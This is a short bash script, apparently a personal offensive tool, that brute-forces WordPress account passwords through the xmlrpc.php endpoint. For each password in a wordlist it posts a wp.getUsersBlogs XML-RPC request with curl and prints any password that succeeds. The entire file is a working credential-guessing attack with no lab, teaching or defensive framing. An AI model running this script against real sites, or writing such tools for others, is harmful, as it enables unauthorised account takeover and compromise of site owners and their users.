#!/bin/bash

#by 666aalexx

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
  tput cnorm
  rm tmpXML.xml
  exit 1
}

function helpPanel(){
  echo -e "\n${blueColour}[+]${endColour} Use: ${blueColour}$0${endColour}\n"
  echo -e "\t${yellowColour}u)${endColour} User"
  echo -e "\t${yellowColour}w)${endColour} Password wordlist"
  echo -e "\t${yellowColour}U)${endColour} URL"
}

function startAttack(){
  tput civis
XMLstructure="<?xml version="1.0" encoding="UTF-8"?>\n<methodCall>\n<methodName>wp.getUsersBlogs</methodName>\n<params>\n<param><value>$user</value></param>\n<param><value>password</value></param>\n</params>\n</methodCall>"
  
curl -s -X POST $URL &>/dev/null
  if [ $? -ne 0 ]; then
    echo -e "\n${redColour}[!]${endColour} ${blueColour}$URL${endColour} does not exist or is not vulnerable to ${yellowColour}xmlrpc abussing${endColour}"
    tput cnorm
    exit 1
  fi

cat $wordlist | while read passwords; do
  for password in $passwords; do
    echo -e $XMLstructure | sed "s/password/$password/" > tmpXML.xml
    curl -s -X POST "$URL/xmlrpc.php" -d@tmpXML.xml | grep "$URL" &>/dev/null
    if [ $? -eq 0 ]; then
      echo -e "${greenColour}[+]${endColour} Password found: ${greenColour}$password${endColour}"
      rm tmpXML.xml
      tput cnorm
      exit 0
    else
      echo -e "${redColour}[X]${endColour} $password"
      sleep 0.01 
      clear
    fi
  done
done
}

parameterCounter=0

while getopts "w:u:U:h" arg; do
  case $arg in
    w) wordlist=$OPTARG; let parameterCounter+=1;;
    u) user=$OPTARG; let parameterCounter+=1;;
    U) URL=$OPTARG; let parameterCounter+=1;;
    h) helpPanel;;
  esac
done

if [ $parameterCounter -eq 3 ]; then
  startAttack
else
  helpPanel
fi
